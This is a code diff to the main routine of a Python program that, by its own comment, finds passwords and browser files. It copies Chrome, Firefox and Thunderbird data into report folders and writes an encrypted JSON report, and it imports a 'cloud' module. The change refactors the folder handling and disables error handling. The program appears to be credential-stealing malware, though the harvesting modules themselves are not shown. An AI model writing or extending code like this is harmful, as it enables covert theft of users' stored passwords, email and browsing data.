@@ -13,17 +13,25 @@ import cloud, browserfile, config, packetizer, crypto, logger
 import os, subprocess, time, json
 
 def main():
-	try:
+	#try:
 		# create directory used for report files
 		reportName = crypto.md5(str(time.time()))
 		completeReportPath = os.path.join(config.START_PATH, reportName)
 		os.mkdir(completeReportPath)
 
 		# find passwords and browser files
-		os.mkdir(os.path.join(completeReportPath, config.GCHROME_COPY_FOLDER))
-		chrome = browserfile.chromeFinder()
-		ffList = browserfile.firefoxFinder()
-		thList = browserfile.thunderbirdFinder()
+		chromeReportFolder = os.path.join(completeReportPath, config.GCHROME_COPY_FOLDER)
+		os.mkdir(chromeReportFolder)
+		chrome = browserfile.chromeFinder(chromeReportFolder)
+
+		ffReportFolder = os.path.join(completeReportPath, config.FF_COPY_FOLDER)
+		os.mkdir(ffReportFolder)
+		ffList = browserfile.firefoxFinder(ffReportFolder)
+
+		thReportFolder = os.path.join(completeReportPath, config.TH_COPY_FOLDER)
+		os.mkdir(thReportFolder)
+		thList = browserfile.thunderbirdFinder(thReportFolder)
+
 		browserPackList = list()
 		browserPackList.append(chrome)
 		browserPackList.append(ffList)
@@ -52,8 +60,8 @@ def main():
 		f.write(json.dumps(crypt, sort_keys=True, indent=4))
 		f.close()
 		logger.log("Report file written to " + os.path.join(config.START_PATH,fileName))
-	except Exception as e:
-		logger.log(e)
+	#except Exception as e:
+		#logger.log(e)
 
 if __name__ == "__main__":
 	main()
